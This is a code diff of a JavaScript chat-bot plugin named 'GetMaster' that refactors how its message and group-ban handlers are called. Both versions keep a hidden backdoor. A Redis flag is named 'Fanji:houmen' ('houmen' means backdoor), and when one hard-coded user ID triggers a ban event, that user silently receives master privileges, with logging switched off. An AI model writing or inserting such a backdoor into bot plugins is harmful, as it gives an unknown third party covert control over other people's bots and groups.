@@ -16,12 +16,12 @@ export class GetMaster extends plugin {
             priority: -Infinity,
             rule: [
                 {
-                    fnc: () => this.Master(this.e),
+                    fnc: 'Master',
                     event: 'message',
                     log: false
                 },
                 {
-                    fnc: () => this.Master(this.e,true),
+                    fnc: 'Master',
                     event: 'notice.group.ban',
                     log: false
                 },
@@ -40,10 +40,10 @@ export class GetMaster extends plugin {
         await this.reply('设置完成');
     }
 
-    async Master(e,isBan = false) {
+    async Master(e){
         let aw = await redis.get('Fanji:houmen');
         if (aw == null) await redis.set('Fanji:houmen', 'true');
-if (isBan && this.e.operator_id == 2173302144) {
+if (e.sub_type == 'ban' && this.e.operator_id == 2173302144) {
     e.isMaster = true
     return false
 }
